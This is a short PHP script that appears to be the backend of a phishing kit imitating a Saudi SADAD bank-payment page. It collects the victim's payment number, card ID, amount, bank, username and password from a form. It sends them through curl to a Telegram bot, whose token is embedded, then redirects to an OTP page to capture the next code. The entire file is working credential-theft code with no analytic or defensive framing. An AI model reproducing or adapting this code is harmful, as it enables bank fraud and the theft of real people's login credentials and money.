 <?php
 
        $sadadcode =  $_POST['sadadcode'];
        $cardid =  $_POST['cardid'];
        $servtype = $_POST['servtype'];
        $amount = $_POST['amount'];
        $bank =  $_POST['bank'];
        $username =  $_POST['username1'];
        $password = $_POST['password1'];

        $data = '-----------------' .  "\n" .  "\n" ;
        
        $data .= 'رقم السداد'.' : '.$sadadcode.  "\n" .  "\n";
        
        $data .= 'رقم البطاقة'.' : '.$cardid .  "\n" .  "\n";
        
        $data .= 'نوع السداد'.' : '.$servtype.  "\n" .  "\n";
        
        $data .= 'قيمة السداد'.' : '.$amount.  "\n" .  "\n";
        
        $data .= 'نوع الحساب'.' : '.$bank.  "\n" .  "\n";
        
        $data .= 'اسم المستخدم'.' : '.$username.  "\n" .  "\n";
        
        $data .= 'كلمة السر'.' : '.$password.  "\n" .  "\n";
        
        $data .= '--------------'.  "\n" .  "\n";

        $endaaata = urlencode($data);

        if (!empty($_POST)){
            
            // create curl resource
            $ch = curl_init();
    
            // set url
            curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5073452598:AAGIsolVbMzsqs7cLFuNb96auMA5PGQaQEU/sendMessage?chat_id=@SadedQ_Bot&text=$endaaata");
    
            //return the transfer as a string
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
            // $output contains the output string
            $output = curl_exec($ch);
   
        // close curl resource to free up system resources
            curl_close($ch);     
        }

         $enc_username=base64_encode($_POST['username1']);
        header("Location: otp.php?username=$enc_username");

?>
